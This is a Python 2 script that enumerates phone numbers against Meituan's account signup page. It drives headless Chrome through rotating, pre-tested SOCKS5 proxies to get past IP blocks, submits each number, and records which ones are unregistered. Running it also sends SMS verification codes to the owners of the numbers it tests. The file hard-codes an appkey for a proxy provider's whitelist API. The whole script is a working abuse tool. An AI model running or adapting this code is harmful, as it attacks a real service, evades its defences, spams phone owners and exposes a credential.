#!/usr/bin/python
# -*- coding: utf-8 -*-

from selenium import webdriver
from multiprocessing.dummy import Pool as ThreadPool
import time 
import re
import requests
import json
import random

#设置代理
def set_proxy():
	global proxy_list
	try:
		proxy = proxy_list.pop()
		# print '[+]Testing '+proxy
		flag=test_proxy(proxy)
		while (flag==False):
			proxy=proxy_list.pop()
			flag=test_proxy(proxy)
		service_args = "--proxy-server=socks5://%s" % proxy
		print '[+]Using proxy '+str(service_args)
		return service_args
	except:
		proxy_list=get_proxy()

#获取手机号信息
def get_message(phone):
	global phone_error
	try:
		options = webdriver.ChromeOptions()
		options.add_argument('--headless')
		options.add_argument('--disable-gpu')
		options.add_argument('--no-sandbox')
		options.add_argument('--disable-dev-shm-usage')
		options.add_argument(set_proxy())
		driver = webdriver.Chrome(chrome_options=options)

		for i in phone:
			try:
				# print '[+]Verifying '+i
				driver.delete_all_cookies()
				time.sleep(1.5)
				driver.get("https://passport.meituan.com/account/unitivesignup")
				
				mobile=driver.find_element_by_name('mobile')
				mobile.send_keys(i)
				time.sleep(0.3)
				button = driver.find_element_by_css_selector("[class='btn-normal btn-mini verify-btn J-verify-btn']")
				button.click()
				time.sleep(0.3)
				button.click()
				time.sleep(1)
				
				pattern='<span class="f1 verify-tip.*>(.*?)</span>'
				res=re.findall(pattern,driver.page_source)
				if res[0]==u'已发送，1分钟后可重新获取。':
					data={i:"unregisted"}
					write(data)
					print data
				elif res[0]==u'该手机号已经注册，请直接登录或找回密码':
					data={i:"registed"}
					# write(data)
					# print data
				else:
					print '[!] '+res[0]
					phone_error.append(i)
					print len(phone_error)
					# driver.save_screenshot('%s.png' %i)
				time.sleep(5)
			except Exception as e:
				print e
				phone_error.append(i)
		driver.quit()
	except Exception as e:
		print e
		for x in phone:
			phone_error.append(x)
	
	
#获取手机号列表
def get_phone(file):
	f=open(file,'r')
	phone_list=f.readlines()
	f.close()
	x=list()
	for i in phone_list:
		x.append(i.replace('\n','').replace('\r',''))
	return x

#获取代理列表
def get_proxy():
	url='http://webapi.http.zhimacangku.com/getip?num=200&type=1&pro=0&city=0&yys=0&port=2&pack=51496&ts=0&ys=0&cs=0&lb=3&sb=0&pb=45&mr=2&regions='
	req=requests.get(url)
	proxy_list=req.content.split()
	if '{' in proxy_list:
		print '[+]Adding white list'
		add_white_list()
		req=requests.get(url)
		proxy_list=req.content.split()
	return proxy_list

#测试代理的可用性
def test_proxy(proxy):
	try:
		testurl = "http://2019.ip138.com/ic.asp"
		options = webdriver.ChromeOptions()
		options.add_argument('--headless')
		options.add_argument('--disable-gpu')
		options.add_argument('--no-sandbox')
		options.add_argument('--disable-dev-shm-usage')
		options.add_argument('--proxy-server=socks5://'+proxy)
		driver = webdriver.Chrome(chrome_options=options)
		driver.set_page_load_timeout(5)
		driver.get(testurl)
		ip_pattern='\[([0-9].*[0-9])' 
		ip=re.findall(ip_pattern,driver.page_source)[0]
		proxy_ip=proxy.split(':')[0]
		if str(ip)==proxy_ip:
			driver.get('https://passport.meituan.com/account/unitivesignup')
			if '403 Forbidden' not in driver.page_source:
				driver.quit()
				return True
			else:
				driver.quit()
				return False
	except:
		driver.quit()
		return False

#保存结果
def write(data):
	with open('result.json','a+') as f:
		json.dump(data,f)

#加入白名单
def add_white_list():
	try:
		get_ip_url='http://webapi.http.zhimacangku.com/getip?num=2&type=1&pro=0&city=0&yys=0&port=2&pack=51496&ts=0&ys=0&cs=0&lb=3&sb=0&pb=45&mr=2&regions='
		res=requests.get(get_ip_url)
		s=json.loads(res.content)
		ip_pattern='[0-9].*[0-9]'
		my_ip=re.findall(ip_pattern, s['msg'])[0]
		set_white_list_url='http://web.http.cnapi.cc/index/index/save_white?neek=69230&appkey=eaef9352fb85ccd3a576d139a4f83d8a&white='+my_ip
		requests.get(set_white_list_url)
		print '[+]Add white list success!'
	except:
		# time.sleep(5)
		pass

#等分列表增加串行
def list_divide(listTemp, n):
	for i in range(0, len(listTemp), n):
		yield listTemp[i:i + n]

def main():
	thread = 1
	n = 5
	phone_list=get_phone('./phone_part3.txt')
	random.shuffle(phone_list)
	print '[+]Phone_list read success!'
	global proxy_list,phone_error
	proxy_list=get_proxy()
	phone_tmp=list_divide(phone_list,n)
	print '[+]List divide success!'

	pool = ThreadPool(processes = thread)
	pool.map(get_message,phone_tmp)
	pool.close()
	pool.join()
	
	print '[+]You have %d phone need verify' % len(phone_error)
	phone_tmp=list_divide(phone_error,n)
	print '[+]Error_phone_list divide success!'
	pool = ThreadPool(processes = thread)
	pool.map(get_message,phone_tmp)
	pool.close()
	pool.join()

if __name__ == '__main__':
	proxy_list=list()
	phone_error=list()
	main()